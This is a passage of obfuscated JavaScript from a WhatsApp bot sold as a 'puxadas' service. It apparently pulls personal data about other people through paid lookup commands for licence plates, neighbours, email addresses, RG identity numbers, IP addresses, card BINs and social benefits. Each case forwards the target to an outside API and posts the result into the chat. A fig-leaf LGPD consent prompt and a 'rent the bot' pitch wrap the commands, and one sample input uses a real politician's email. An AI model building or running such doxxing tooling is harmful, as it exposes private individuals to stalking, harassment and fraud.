                    text: "➠ A consulta foi enviado em seu privado.\n\n\n🐎 BOT X-BOT - PUXADAS\n\n\n✅ CONSULTA REALIZADA ✅"
                  }, _0x16ddf7);
                }
              } catch (_0x32732c) {
                console.log(_0x32732c);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "beneficios":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "beneficios nome");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x58e02b = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x2348fc = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x58e02b, _0x2348fc);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x6435fe = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x6435fe);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x5a920c = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x5a920c);
                }
              } catch (_0x30d554) {
                console.log(_0x30d554);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "placa":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "placa1 OGT0458");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x298029 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0xf451b = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x298029, _0xf451b);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x446369 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x446369);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x32f41c = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x32f41c);
                }
              } catch (_0x54912a) {
                console.log(_0x54912a);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "vizinhos":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "vizinhos 27867260854");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x261f9f = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x2d3a4c = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x261f9f, _0x2d3a4c);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x3ab815 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x3ab815);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x111cf7 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x111cf7);
                }
              } catch (_0x9d2dee) {
                console.log(_0x9d2dee);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "email":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "email jair.messiasbolsonaro@yahoo.com.br");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x47ea8e = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x3adb4b = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x47ea8e, _0x3adb4b);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x35db7e = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x35db7e);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0xafcd90 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviado em seu privado.\n\n\n🐎 BOT X-BOT - PUXADAS\n\n\n✅ CONSULTA REALIZADA ✅"
                  }, _0xafcd90);
                }
              } catch (_0x484ff4) {
                console.log(_0x484ff4);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "site":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "site link");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x471da7 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x23ba4b = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x471da7, _0x23ba4b);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x1d7754 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x1d7754);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x2e0153 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x2e0153);
                }
              } catch (_0x4c3e8d) {
                console.log(_0x4c3e8d);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "ip":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "ip 47.232.216.168");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x3137b0 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x51bd59 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x3137b0, _0x51bd59);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x5272cf = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x5272cf);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x29e912 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviado em seu privado.\n\n\n🐎 BOT X-BOT - PUXADAS\n\n\n✅ CONSULTA REALIZADA ✅"
                  }, _0x29e912);
                }
              } catch (_0x427332) {
                console.log(_0x427332);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "bin":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "bin 52456378");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x378d4a = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x408201 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x378d4a, _0x408201);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x36c4bf = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x36c4bf);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x5e2964 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviado em seu privado.\n\n\n🐎 BOT X-BOT - PUXADAS\n\n\n✅ CONSULTA REALIZADA ✅"
                  }, _0x5e2964);
                }
              } catch (_0x1cfa52) {
                console.log(_0x1cfa52);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "dominio":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "dominio youtube.com");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x5c0eda = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x4f3244 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x5c0eda, _0x4f3244);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x2bd04f = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x2bd04f);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x24d6ab = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviado em seu privado.\n\n\n🐎 BOT X-BOT - PUXADAS\n\n\n✅ CONSULTA REALIZADA ✅"
                  }, _0x24d6ab);
                }
              } catch (_0x57f24d) {
                console.log(_0x57f24d);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "rg":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "rg numero");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x33c750 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x4f595b = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x33c750, _0x4f595b);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x22a5a1 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x22a5a1);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x37a78a = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x37a78a);
                }
              } catch (_0x5bad51) {
                console.log(_0x5bad51);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "rg2":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "rg2 numero");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x5e524a = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x297896 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x5e524a, _0x297896);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x4e5433 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4e5433);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0xc3976f = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0xc3976f);
                }
              } catch (_0x6a4f44) {
                console.log(_0x6a4f44);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "bin":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "bin numero");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x2294e0 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x385392 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x2294e0, _0x385392);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x5f47a2 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x5f47a2);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x3c619a = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x3c619a);
                }
              } catch (_0x7454ef) {
                console.log(_0x7454ef);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "site":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "site link");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x3f3974 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x56815e = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x3f3974, _0x56815e);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x65b015 = {
